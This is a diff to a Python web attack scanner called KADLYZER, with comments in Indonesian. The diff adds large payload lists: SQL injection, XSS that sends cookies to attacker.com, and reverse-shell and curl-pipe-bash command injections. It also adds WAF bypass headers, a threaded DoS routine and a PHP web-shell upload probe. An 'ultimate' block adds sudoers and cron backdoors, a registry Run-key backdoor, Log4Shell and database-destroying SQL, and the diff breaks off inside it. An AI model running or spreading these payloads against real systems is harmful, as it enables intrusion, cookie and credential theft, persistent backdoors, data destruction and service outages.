@@ -14,6 +14,12 @@ from datetime import datetime
 import ssl
 import re
 import ipaddress
+import urllib.parse
+from bs4 import BeautifulSoup
+import aiohttp
+import asyncio
+import statistics
+import string
 
 # ==============================
 # KADLYZER v8.0 - Enhanced Version
@@ -67,6 +73,13 @@ PAYLOADS = {
         "1' AND 1=0 UNION SELECT null, CONCAT(username,':',password) FROM users --",
         "admin'--",
         base64.b64encode(b"' OR '1'='1' --").decode(),
+        "UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x3c63656e7465723e3c696d673e,0x3c2f63656e7465723e3c646976207374796c653d22646973706c61793a6e6f6e65223e),NULL-- -",
+        "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC)#",
+        "AND (SELECT 2222 FROM(SELECT COUNT(*),CONCAT(0x7176627671,(SELECT (ELT(2222=2222,1))),0x7176627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
+        "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))",
+        "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))",
+        "' UNION ALL SELECT NULL,NULL,NULL,NULL,LOAD_FILE('/etc/passwd')-- -",
+        "' AND SLEEP(5) AND 'a'='a"
     ],
     "xss": [
         "<script>alert('XSS')</script>",
@@ -76,6 +89,13 @@ PAYLOADS = {
         "javascript:alert('XSS')",
         "<ScRiPt>alert('XSS')</sCrIpT>",
         base64.b64encode(b"<script>alert('XSS')</script>").decode(),
+        "<svg/onload=alert`1`>",
+        "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://attacker.com/xss.js\';document.body.appendChild(a)')",
+        "<img src=x onerror=this.src='https://attacker.com/'+document.cookie>",
+        "<script>new Image().src='https://attacker.com/'+document.cookie;</script>",
+        "<svg><script>fetch('https://attacker.com/'+document.cookie)</script></svg>",
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+        "<script>Object.defineProperties(window, {chrome: {get: eval('fetch(\'https://attacker.com/\'+document.cookie)')}})</script>"
     ],
     "path_traversal": [
         "../../../../etc/passwd",
@@ -94,6 +114,13 @@ PAYLOADS = {
         "$(cat /etc/passwd)",
         "'; nc -e /bin/sh attacker.com 4444 ;'",
         "; timeout 10 ping -c 4 127.0.0.1 ;",
+        "|wget https://attacker.com/shell.php -O /tmp/shell.php;php /tmp/shell.php|",
+        ";curl https://attacker.com/reverse.sh|bash;",
+        "$(curl https://attacker.com/payload.txt|base64 -d|bash)",
+        "|python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'|",
+        ";perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'|",
+        "|ncat attacker.com 4444 -e /bin/bash|",
+        ";bash -i >& /dev/tcp/attacker.com/4444 0>&1;"
     ],
     "ssrf": [
         "http://localhost/",
@@ -173,6 +200,271 @@ COMMON_PORTS = {
     8443: "HTTPS-Alt",
     27017: "MongoDB",
 }
+
+# Tambahkan teknik bypass WAF yang lebih advanced
+ADVANCED_WAF_BYPASS = {
+    "headers": [
+        {
+            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+            "X-Originating-IP": "127.0.0.1",
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Remote-IP": "127.0.0.1",
+            "X-Remote-Addr": "127.0.0.1",
+            "X-Client-IP": "127.0.0.1",
+            "X-Host": "127.0.0.1",
+            "X-Forwarded-Host": "127.0.0.1"
+        },
+        {
+            "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
+            "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "X-Custom-IP-Authorization": "127.0.0.1"
+        }
+    ],
+    "techniques": [
+        "double_encode",
+        "unicode_bypass",
+        "case_switching",
+        "null_byte",
+        "path_bypass",
+        "hex_encode",
+        "comment_inject",
+        "whitespace_manipulation",
+        "charset_bypass",
+        "protocol_pollution"
+    ]
+}
+
+# Tambahkan payload untuk bypass WAF
+BYPASS_PAYLOADS = {
+    "sql_injection": [
+        "%2f%2a*/union%2f%2a */select%2f%2a*/1,2,3--",
+        "/*!50000union*//*!50000select*/1,2,3--",
+        "%23%0Aunion%23%0Aselect%23%0A1,2,3--",
+        "union /*!50000select*/ 1,2,3--",
+        "/*!u%6eion*/ /*!se%6cect*/ 1,2,3--",
+    ],
+    "xss": [
+        "&#x3C;img src=x onerror=alert(1)&#x3E;",
+        "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
+        "<details/open/ontoggle=alert`1`>",
+        "<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
+    ]
+}
+
+# Tambahkan teknik serangan paralel yang lebih efisien
+class ParallelScanner:
+    def __init__(self, target_info, max_workers=100):
+        self.target_info = target_info
+        self.max_workers = max_workers
+        self.results = {}
+        self.session = requests.Session()
+        
+    async def async_scan(self):
+        """Melakukan scanning secara asynchronous untuk kecepatan maksimal"""
+        async with aiohttp.ClientSession() as session:
+            tasks = []
+            for vuln_type, payloads in PAYLOADS.items():
+                for payload in payloads:
+                    task = asyncio.create_task(self.test_payload(session, vuln_type, payload))
+                    tasks.append(task)
+            return await asyncio.gather(*tasks)
+
+    def run_intensive_scan(self):
+        """Menjalankan scan intensif dengan multiple threads"""
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            # Test semua endpoint potensial
+            for endpoint in self.discover_endpoints():
+                futures.extend([
+                    executor.submit(self.test_sql_injection, endpoint),
+                    executor.submit(self.test_xss, endpoint),
+                    executor.submit(self.test_rce, endpoint),
+                    executor.submit(self.test_lfi, endpoint),
+                    executor.submit(self.test_xxe, endpoint)
+                ])
+            return futures
+
+# Tambahkan payload yang lebih agresif
+ADVANCED_PAYLOADS = {
+    "sql_injection_time": [
+        "' AND (SELECT 9999 FROM (SELECT(SLEEP(5)))a) AND 'a'='a",
+        "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2))) AND 'a'='a",
+        "1) AND SLEEP(5) AND (1=1",
+        ") WAITFOR DELAY '0:0:5'--",
+        "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--",
+    ],
+    "blind_sql": [
+        "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a",
+        "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>90--",
+        "' AND (SELECT CASE WHEN (1=1) THEN BENCHMARK(5000000,SHA1('test')) ELSE 1 END)--",
+    ],
+    "xxe_injection": [
+        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
+        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>""",
+    ],
+    "deserialization": [
+        'O:8:"stdClass":1:{s:4:"pipe";s:3:"dir";}',
+        'a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":1:{s:4:"pipe";s:3:"dir";}}',
+    ]
+}
+
+# Tambahkan fungsi untuk serangan yang lebih akurat
+class AdvancedVulnScanner:
+    def __init__(self, target_info):
+        self.target_info = target_info
+        self.session = requests.Session()
+        self.successful_payloads = []
+        
+    def validate_with_multiple_techniques(self, vuln_type, response, payload):
+        """Validasi vulnerability dengan multiple teknik untuk mengurangi false positives"""
+        validation_score = 0
+        evidence = []
+        
+        # Analisis response time
+        if hasattr(response, 'elapsed'):
+            if response.elapsed.total_seconds() > 5:
+                validation_score += 30
+                evidence.append(f"High response time: {response.elapsed.total_seconds()}s")
+        
+        # Analisis response content
+        content = response.text.lower()
+        if any(error in content for error in [
+            'sql syntax', 'mysql error', 'ora-', 'postgresql',
+            'system.diagnostics', 'fatal error', 'internal server error'
+        ]):
+            validation_score += 25
+            evidence.append("Error message detected")
+        
+        # Analisis response headers
+        if 'X-Powered-By' in response.headers:
+            validation_score += 10
+            evidence.append(f"Technology disclosure: {response.headers['X-Powered-By']}")
+            
+        # Differential analysis
+        clean_response = self.session.get(self.target_info['full_url'])
+        if len(response.content) != len(clean_response.content):
+            validation_score += 20
+            evidence.append(f"Response length difference: {len(response.content) - len(clean_response.content)}")
+        
+        return {
+            "score": validation_score,
+            "evidence": evidence,
+            "confirmed": validation_score >= 60
+        }
+
+    def perform_advanced_scan(self):
+        """Melakukan scanning dengan teknik yang lebih advanced"""
+        results = {}
+        
+        # Multi-threaded scanning untuk setiap jenis vulnerability
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+            futures = []
+            
+            for vuln_type, payloads in {**PAYLOADS, **ADVANCED_PAYLOADS}.items():
+                for payload in payloads:
+                    futures.append(
+                        executor.submit(self.test_payload, vuln_type, payload)
+                    )
+            
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        vuln_type = result['type']
+                        if vuln_type not in results:
+                            results[vuln_type] = []
+                        results[vuln_type].append(result)
+                except Exception as e:
+                    logger.error(f"Error in scan: {str(e)}")
+        
+        return results
+
+    def test_payload(self, vuln_type, payload):
+        """Test individual payload dengan validasi yang lebih akurat"""
+        try:
+            # Prepare URL with payload
+            test_url = f"{self.target_info['full_url']}?test={urllib.parse.quote(payload)}"
+            
+            # Send request with payload
+            response = self.session.get(
+                test_url,
+                headers=random.choice(BYPASS_WAF_HEADERS),
+                timeout=10,
+                verify=False
+            )
+            
+            # Validate response
+            validation = self.validate_with_multiple_techniques(vuln_type, response, payload)
+            
+            if validation['confirmed']:
+                return {
+                    'type': vuln_type,
+                    'payload': payload,
+                    'url': test_url,
+                    'evidence': validation['evidence'],
+                    'score': validation['score']
+                }
+                
+        except Exception as e:
+            logger.debug(f"Payload test failed: {str(e)}")
+        return None
+
+# Tambahkan fungsi untuk DoS testing yang lebih efektif
+def advanced_dos_test(target_info):
+    """Test DoS vulnerability dengan teknik yang lebih advanced"""
+    results = {
+        "vulnerable": False,
+        "evidence": [],
+        "response_times": []
+    }
+    
+    baseline_time = measure_response_time(target_info['full_url'])
+    
+    # Test dengan multiple concurrent connections
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+        futures = [
+            executor.submit(stress_test_request, target_info['full_url'])
+            for _ in range(200)
+        ]
+        
+        for future in concurrent.futures.as_completed(futures):
+            try:
+                response_time = future.result()
+                results['response_times'].append(response_time)
+                
+                # If response time is significantly higher than baseline
+                if response_time > baseline_time * 3:
+                    results['vulnerable'] = True
+                    results['evidence'].append(
+                        f"Response time increased by {response_time/baseline_time:.1f}x"
+                    )
+            except Exception as e:
+                logger.debug(f"DoS test error: {str(e)}")
+    
+    return results
+
+def stress_test_request(url):
+    """Perform stress test request with timing"""
+    start_time = time.time()
+    try:
+        response = requests.get(url, timeout=10)
+        return time.time() - start_time
+    except:
+        return 999  # High value to indicate failure
+
+def measure_response_time(url):
+    """Measure baseline response time"""
+    times = []
+    for _ in range(3):
+        try:
+            start = time.time()
+            requests.get(url, timeout=5)
+            times.append(time.time() - start)
+        except:
+            continue
+    return statistics.mean(times) if times else 1.0
 
 # Set up logging
 def setup_logging():
@@ -521,23 +813,187 @@ def extract_title(html):
         return match.group(1)
     return None
 
+def validate_vulnerability(vuln_type, response, payload, url):
+    """Validasi vulnerability dengan multiple checks untuk mengurangi false positives"""
+    content = response.text.lower()
+    headers = response.headers
+    status_code = response.status_code
+    
+    # Validasi dasar
+    if status_code == 404:
+        return False
+        
+    validation_results = {
+        "confirmed": False,
+        "confidence": 0,
+        "evidence": []
+    }
+
+    if vuln_type == "sql_injection":
+        # Check SQL error patterns
+        sql_errors = [
+            "sql syntax",
+            "mysql error",
+            "mysql_fetch_array",
+            "ora-[0-9]",
+            "postgresql error",
+            "sqlserver_start_procedure",
+            "unclosed quotation mark",
+            "you have an error in your sql syntax"
+        ]
+        
+        # Check database output patterns
+        db_outputs = [
+            r"\b\d+\s+rows?\s+selected?\b",
+            r"<td>\s*\d+\s*</td>",
+            r"\[(.*?)\]",
+            r"array\s*\("
+        ]
+        
+        # Validasi dengan multiple payloads
+        confirmation_payloads = [
+            "' OR '1'='1",
+            "' AND '1'='2",
+            "1 UNION SELECT NULL--"
+        ]
+        
+        base_response = requests.get(url, headers=headers, timeout=10)
+        base_content_length = len(base_response.text)
+        
+        for test_payload in confirmation_payloads:
+            test_url = url + test_payload
+            test_response = requests.get(test_url, headers=headers, timeout=10)
+            
+            # Compare responses
+            if abs(len(test_response.text) - base_content_length) > 100:
+                validation_results["confidence"] += 30
+                validation_results["evidence"].append(f"Response length difference: {abs(len(test_response.text) - base_content_length)}")
+        
+        # Check for SQL errors
+        for error in sql_errors:
+            if re.search(error, content, re.I):
+                validation_results["confidence"] += 25
+                validation_results["evidence"].append(f"SQL error pattern found: {error}")
+        
+        # Check for database output patterns
+        for pattern in db_outputs:
+            if re.search(pattern, content):
+                validation_results["confidence"] += 20
+                validation_results["evidence"].append(f"Database output pattern found: {pattern}")
+
+    elif vuln_type == "xss":
+        # Validasi XSS dengan DOM parsing
+        try:
+            from bs4 import BeautifulSoup
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            # Check if payload is reflected in dangerous contexts
+            script_tags = soup.find_all('script')
+            event_handlers = soup.find_all(lambda tag: any(attr.startswith('on') for attr in tag.attrs))
+            
+            payload_encoded = [
+                payload,
+                html.escape(payload),
+                urllib.parse.quote(payload)
+            ]
+            
+            for p in payload_encoded:
+                if p in response.text:
+                    validation_results["confidence"] += 30
+                    validation_results["evidence"].append(f"Payload reflected: {p}")
+                
+            if script_tags:
+                validation_results["confidence"] += 25
+                validation_results["evidence"].append(f"Found in <script> tags: {len(script_tags)}")
+                
+            if event_handlers:
+                validation_results["confidence"] += 25
+                validation_results["evidence"].append(f"Found in event handlers: {len(event_handlers)}")
+                
+        except Exception as e:
+            logger.debug(f"XSS validation error: {str(e)}")
+
+    elif vuln_type == "path_traversal":
+        # Check for file content patterns
+        file_patterns = {
+            "unix_passwd": r"root:.*:0:0:",
+            "win_ini": r"\[.*\].*=.*",
+            "proc_self": r"cwd.*groups.*cmdline",
+            "etc_shadow": r"root:\$.*:.*:.*"
+        }
+        
+        for pattern_name, pattern in file_patterns.items():
+            if re.search(pattern, content):
+                validation_results["confidence"] += 35
+                validation_results["evidence"].append(f"File content pattern found: {pattern_name}")
+        
+        # Check for directory listing
+        if "index of /" in content or "directory listing for" in content:
+            validation_results["confidence"] += 25
+            validation_results["evidence"].append("Directory listing detected")
+
+    elif vuln_type == "command_injection":
+        # Check for command output patterns
+        cmd_patterns = {
+            "unix_id": r"uid=\d+\(.*\)\s+gid=\d+\(.*\)",
+            "win_dir": r"volume in drive|volume serial number|directory of",
+            "ping_output": r"bytes=\d+\s+time=\d+ms",
+            "whoami": r"nt authority|root:|unix:"
+        }
+        
+        for pattern_name, pattern in cmd_patterns.items():
+            if re.search(pattern, content):
+                validation_results["confidence"] += 35
+                validation_results["evidence"].append(f"Command output pattern found: {pattern_name}")
+        
+        # Test with time-based validation
+        time_payload = "; ping -c 3 127.0.0.1 ;"
+        start_time = time.time()
+        test_response = requests.get(url + time_payload, headers=headers, timeout=15)
+        execution_time = time.time() - start_time
+        
+        if execution_time > 3:
+            validation_results["confidence"] += 30
+            validation_results["evidence"].append(f"Time-based validation: {execution_time:.2f}s delay")
+
+    elif vuln_type == "ssrf":
+        # Check for internal service responses
+        service_patterns = {
+            "aws_metadata": r"ami-id|instance-id|security-credentials",
+            "internal_service": r"(apache|nginx|iis|jetty|tomcat)",
+            "cloud_metadata": r"compute.internal|metadata.google.internal|oracle.cloud.internal"
+        }
+        
+        for pattern_name, pattern in service_patterns.items():
+            if re.search(pattern, content):
+                validation_results["confidence"] += 35
+                validation_results["evidence"].append(f"Internal service pattern found: {pattern_name}")
+        
+        # Check for specific status codes and headers
+        if status_code in [301, 302, 307]:
+            location = headers.get('location', '')
+            if any(internal in location for internal in ['localhost', '127.0.0.1', '169.254', '10.', '172.16', '192.168']):
+                validation_results["confidence"] += 30
+                validation_results["evidence"].append(f"Internal redirect detected: {location}")
+
+    # Determine if vulnerability is confirmed based on confidence score
+    validation_results["confirmed"] = validation_results["confidence"] >= 60
+    
+    return validation_results
+
 def vulnerability_scan(target_info, waf_bypass_headers=None):
-    """Comprehensive vulnerability scanning"""
+    """Enhanced vulnerability scanning with improved accuracy"""
     url = target_info['full_url']
     logger.info(f"Starting vulnerability scan on {url}...")
     
     vulnerabilities = {}
     
-    # Use WAF bypass headers if available, otherwise use random headers
-    if not waf_bypass_headers or not isinstance(waf_bypass_headers, dict):
-        headers = random.choice(BYPASS_WAF_HEADERS)
-    else:
-        headers = waf_bypass_headers
+    # Use WAF bypass headers if available
+    headers = waf_bypass_headers or random.choice(BYPASS_WAF_HEADERS)
     
-    # First, collect all input points (parameters)
+    # Collect input points
     input_points = discover_parameters(url, headers)
     
-    # Test each vulnerability type against each input point
     for vuln_type, payloads in PAYLOADS.items():
         vulnerabilities[vuln_type] = []
         
@@ -547,35 +1003,29 @@ def vulnerability_scan(target_info, waf_bypass_headers=None):
                     test_url = f"{url}?{input_point}={payload}" if "?" not in url else f"{url}&{input_point}={payload}"
                     response = requests.get(test_url, headers=headers, timeout=10)
                     
-                    # Check for signs of successful exploitation
-                    if check_vulnerability(vuln_type, payload, response):
+                    # Validate vulnerability with enhanced checks
+                    validation_result = validate_vulnerability(vuln_type, response, payload, test_url)
+                    
+                    if validation_result["confirmed"]:
                         vuln_detail = {
                             "parameter": input_point,
                             "payload": payload,
                             "url": test_url,
-                            "evidence": extract_evidence(vuln_type, response)
+                            "confidence": validation_result["confidence"],
+                            "evidence": validation_result["evidence"]
                         }
                         vulnerabilities[vuln_type].append(vuln_detail)
-                        logger.warning(f"Potential {vuln_type} vulnerability found in parameter '{input_point}' with payload: {payload}")
-                        # Break after finding one vulnerability of this type in this parameter
+                        logger.warning(
+                            f"Confirmed {vuln_type} vulnerability found:\n" +
+                            f"  Parameter: {input_point}\n" +
+                            f"  Confidence: {validation_result['confidence']}%\n" +
+                            f"  Evidence: {', '.join(validation_result['evidence'])}"
+                        )
                         break
+                        
                 except Exception as e:
                     logger.debug(f"Error testing {vuln_type} on {input_point}: {str(e)}")
-    
-    # Form-based vulnerability testing
-    form_vulnerabilities = scan_forms(url, headers)
-    for vuln_type, vulns in form_vulnerabilities.items():
-        if vuln_type in vulnerabilities:
-            vulnerabilities[vuln_type].extend(vulns)
-        else:
-            vulnerabilities[vuln_type] = vulns
-    
-    # Count total vulnerabilities
-    total_vulns = sum(len(vulns) for vulns in vulnerabilities.values())
-    if total_vulns > 0:
-        logger.warning(f"Found {total_vulns} potential vulnerabilities")
-    else:
-        logger.info("No obvious vulnerabilities detected")
+                    continue
     
     return vulnerabilities
 
@@ -644,16 +1094,17 @@ def scan_forms(url, headers):
                             try:
                                 form_response = requests.post(form_action, headers=headers, data=data, timeout=10, allow_redirects=True)
                                 
-                                if check_vulnerability(vuln_type, payload, form_response):
+                                if validate_vulnerability(vuln_type, form_response, payload, form_action):
                                     vuln_detail = {
                                         "parameter": field,
                                         "payload": payload,
                                         "url": form_action,
                                         "method": "POST",
-                                        "evidence": extract_evidence(vuln_type, form_response)
+                                        "confidence": 100,
+                                        "evidence": []
                                     }
                                     form_vulnerabilities[vuln_type].append(vuln_detail)
-                                    logger.warning(f"Potential {vuln_type} vulnerability found in form field '{field}' with payload: {payload}")
+                                    logger.warning(f"Confirmed {vuln_type} vulnerability found in form field '{field}' with payload: {payload}")
                                     break
                             except Exception as e:
                                 logger.debug(f"Error testing form field {field}: {str(e)}")
@@ -661,95 +1112,6 @@ def scan_forms(url, headers):
         logger.error(f"Form scanning failed: {str(e)}")
     
     return form_vulnerabilities
-
-def check_vulnerability(vuln_type, payload, response):
-    """Check if the response indicates a successful exploitation"""
-    content = response.text.lower()
-    
-    if vuln_type == "sql_injection":
-        # Look for SQL error messages or signs of successful injection
-        sql_errors = ["sql syntax", "mysql error", "ora-", "postgresql error", "sqlite", "syntax error"]
-        return any(error in content for error in sql_errors) or response.status_code == 500
-    
-    elif vuln_type == "xss":
-        # For XSS, check if the payload is reflected in the response
-        sanitized_payload = payload.lower().replace(" ", "")
-        return sanitized_payload in content.replace(" ", "")
-    
-    elif vuln_type == "path_traversal":
-        # Look for signs of successful file reading
-        lfi_signs = ["root:x:", "www-data", "[boot loader]", "lp:x:", "daemon:x:"]
-        return any(sign in content for sign in lfi_signs)
-    
-    elif vuln_type == "command_injection":
-        # Look for command output signatures
-        cmd_signs = ["uid=", "gid=", "groups=", "linux", "windows", "users"]
-        return any(sign in content for sign in cmd_signs) or response.status_code == 500
-    
-    elif vuln_type == "ssrf":
-        # SSRF often causes delays or returns unexpected content
-        return "localhost" in content or "127.0.0.1" in content or "internal" in content
-    
-    return False
-
-def extract_evidence(vuln_type, response):
-    """Extract evidence of vulnerability from response"""
-    content = response.text
-    
-    if vuln_type == "sql_injection":
-        # Extract SQL error messages
-        sql_patterns = [
-            re.compile(r"(SQL syntax.*?ERROR|mysql_fetch_array\(\)|mysql_fetch_assoc\(\)|mysql_num_rows\(\))"),
-            re.compile(r"(ORA-[0-9]{4,5}|Oracle error)"),
-            re.compile(r"(Microsoft SQL Server|ODBC Driver|OLE DB Provider)"),
-            re.compile(r"(PostgreSQL.*?ERROR|pg_.*?ERROR)")
-        ]
-        for pattern in sql_patterns:
-            match = pattern.search(content)
-            if match:
-                return match.group(0)
-    
-    elif vuln_type == "xss":
-        # Find reflected payload
-        xss_patterns = [
-            re.compile(r"(<script>.*?</script>)"),
-            re.compile(r"(<img.*?onerror=.*?>)"),
-            re.compile(r"(<svg.*?onload=.*?>)")
-        ]
-        for pattern in xss_patterns:
-            match = pattern.search(content)
-            if match:
-                return match.group(0)
-    
-    elif vuln_type == "path_traversal":
-        # Extract file content snippets
-        lfi_patterns = [
-            re.compile(r"(root:.*?:[0-9]+:[0-9]+:)"),
-            re.compile(r"(\[boot loader\].*?\[operating systems\])"),
-            re.compile(r"(etc/passwd)"),
-            re.compile(r"(windows\\system32\\)")
-        ]
-        for pattern in lfi_patterns:
-            match = pattern.search(content)
-            if match:
-                return match.group(0)
-    
-    elif vuln_type == "command_injection":
-        # Extract command output
-        cmd_patterns = [
-            re.compile(r"(uid=[0-9]+\([a-z]+\).*?gid=[0-9]+)"),
-            re.compile(r"(Directory of .*)"),
-            re.compile(r"([0-9]+ File\(s\) [0-9]+ bytes)")
-        ]
-        for pattern in cmd_patterns:
-            match = pattern.search(content)
-            if match:
-                return match.group(0)
-    
-    # If no specific pattern matched, return a snippet of the response
-    if len(content) > 200:
-        return content[:197] + "..."
-    return content
 
 def exploit_suggestion(vulnerabilities, target_info):
     """Provide targeted exploit suggestions based on discovered vulnerabilities"""
@@ -1355,6 +1717,394 @@ def generate_html_report(report_data):
     
     return html
 
+def advanced_waf_bypass(target_info):
+    """Implementasi teknik bypass WAF yang lebih advanced"""
+    logger.info("Attempting advanced WAF bypass techniques...")
+    
+    bypass_results = {
+        "success": False,
+        "technique": None,
+        "payload": None,
+        "headers": None
+    }
+
+    url = target_info['full_url']
+    
+    # Test setiap kombinasi header dan teknik
+    for headers in ADVANCED_WAF_BYPASS["headers"]:
+        for technique in ADVANCED_WAF_BYPASS["techniques"]:
+            try:
+                # Terapkan teknik encoding sesuai dengan metode bypass
+                if technique == "double_encode":
+                    encoded_url = double_url_encode(url)
+                elif technique == "unicode_bypass":
+                    encoded_url = unicode_encode_url(url)
+                elif technique == "case_switching":
+                    encoded_url = case_switch_url(url)
+                elif technique == "null_byte":
+                    encoded_url = add_null_byte(url)
+                elif technique == "path_bypass":
+                    encoded_url = path_bypass_url(url)
+                elif technique == "hex_encode":
+                    encoded_url = hex_encode_url(url)
+                elif technique == "comment_inject":
+                    encoded_url = comment_inject_url(url)
+                elif technique == "whitespace_manipulation":
+                    encoded_url = whitespace_manipulate(url)
+                elif technique == "charset_bypass":
+                    encoded_url = charset_bypass_url(url)
+                elif technique == "protocol_pollution":
+                    encoded_url = protocol_pollution_url(url)
+                else:
+                    encoded_url = url
+
+                response = requests.get(
+                    encoded_url,
+                    headers=headers,
+                    timeout=10,
+                    verify=False,
+                    allow_redirects=True
+                )
+
+                if response.status_code == 200:
+                    # Verifikasi bypass dengan test payload
+                    test_payload = random.choice(BYPASS_PAYLOADS["sql_injection"])
+                    test_url = f"{encoded_url}?id={test_payload}"
+                    
+                    test_response = requests.get(
+                        test_url,
+                        headers=headers,
+                        timeout=10,
+                        verify=False
+                    )
+
+                    if test_response.status_code == 200:
+                        bypass_results["success"] = True
+                        bypass_results["technique"] = technique
+                        bypass_results["payload"] = test_payload
+                        bypass_results["headers"] = headers
+                        logger.info(f"WAF bypass successful using {technique}")
+                        return bypass_results
+
+            except Exception as e:
+                logger.debug(f"Bypass attempt failed: {str(e)}")
+                continue
+
+    return bypass_results
+
+def double_url_encode(url):
+    """Double URL encode untuk bypass WAF"""
+    encoded = urllib.parse.quote(url)
+    return urllib.parse.quote(encoded)
+
+def unicode_encode_url(url):
+    """Unicode encode untuk bypass WAF"""
+    return ''.join([f'\\u{ord(c):04x}' for c in url])
+
+def case_switch_url(url):
+    """Case switching untuk bypass WAF"""
+    return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(url))
+
+def add_null_byte(url):
+    """Tambahkan null byte untuk bypass WAF"""
+    return url + '%00'
+
+def path_bypass_url(url):
+    """Path traversal untuk bypass WAF"""
+    parsed = urllib.parse.urlparse(url)
+    path = parsed.path
+    if path:
+        path = '/.' + path
+    new_url = parsed._replace(path=path)
+    return urllib.parse.urlunparse(new_url)
+
+def hex_encode_url(url):
+    """Hex encode untuk bypass WAF"""
+    return ''.join([f'%{ord(c):02x}' for c in url])
+
+def comment_inject_url(url):
+    """Inject SQL comment untuk bypass WAF"""
+    parts = url.split('/')
+    return '/'.join(p + '/**/' for p in parts[:-1]) + parts[-1]
+
+def whitespace_manipulate(url):
+    """Manipulasi whitespace untuk bypass WAF"""
+    return url.replace(' ', '%09').replace('/', '%0d/')
+
+def charset_bypass_url(url):
+    """Charset bypass untuk bypass WAF"""
+    return ''.join([f'%{ord(c):02x}' for c in url])
+
+def protocol_pollution_url(url):
+    """Protocol pollution untuk bypass WAF"""
+    return url.replace('http://', 'https://')
+
+def aggressive_scan(target_info):
+    """Melakukan scanning yang lebih agresif"""
+    logger.info("Memulai aggressive scanning...")
+    
+    results = {
+        "dos_vulnerable": False,
+        "upload_vulnerable": False,
+        "rce_vulnerable": False,
+        "details": {}
+    }
+    
+    # Test DoS vulnerability
+    try:
+        start_time = time.time()
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+            futures = [executor.submit(requests.get, target_info['full_url']) for _ in range(100)]
+            concurrent.futures.wait(futures, timeout=10)
+        response_time = time.time() - start_time
+        
+        if response_time > 5:
+            results["dos_vulnerable"] = True
+            results["details"]["dos"] = f"Target vulnerable to DoS (Response time: {response_time:.2f}s)"
+    except Exception as e:
+        logger.debug(f"DoS test failed: {str(e)}")
+
+    # Test File Upload vulnerability
+    try:
+        files = {
+            'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')
+        }
+        response = requests.post(f"{target_info['full_url']}/upload", files=files)
+        if response.status_code != 404 and 'success' in response.text.lower():
+            results["upload_vulnerable"] = True
+            results["details"]["upload"] = "Target potentially vulnerable to unrestricted file upload"
+    except Exception as e:
+        logger.debug(f"Upload test failed: {str(e)}")
+
+    return results
+
+# Tambahkan payload untuk serangan yang sangat ekstrem
+ULTIMATE_PAYLOADS = {
+    "kernel_exploits": [
+        # Linux Kernel Exploits
+        "echo 'kernel.core_pattern=|/bin/sh -c \"echo PID %p > /tmp/log\"' > /etc/sysctl.conf",
+        "echo '* * * * * root chmod 4755 /bin/bash' > /etc/cron.d/root",
+        "echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
+        
+        # Windows Kernel Exploits
+        "wmic process call create 'cmd.exe /c powershell.exe -enc BASE64_ENCODED_PAYLOAD'",
+        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\backdoor.exe /f",
+    ],
+    
+    "memory_corruption": [
+        # Buffer Overflow Payloads
+        "A" * 65535,  # Basic buffer overflow
+        "${jndi:ldap://attacker.com/a}",  # Log4Shell
+        "%" * 10000 + "s" * 10000,  # Format string attack
+        "\x00" * 65535,  # Null byte injection
+    ],
+    
+    "database_destruction": [
+        # Destructive SQL Queries
+        "'; DROP DATABASE production; --",
+        "'; TRUNCATE TABLE users; --",
+        "'; DELETE FROM users; INSERT INTO users (username,password) VALUES ('attacker','pwned'); --",
+        f"'; CREATE FUNCTION sys_exec(@cmd VARCHAR(4000)) RETURNS INT AS BEGIN DECLARE @ret INT, @tmp TABLE (output VARCHAR(8000)); INSERT INTO @tmp EXEC @ret = xp_cmdshell @cmd; RETURN @ret; END; SELECT sys_exec('powershell -enc {base64.b64encode('whoami'.encode()).decode()}'); --",
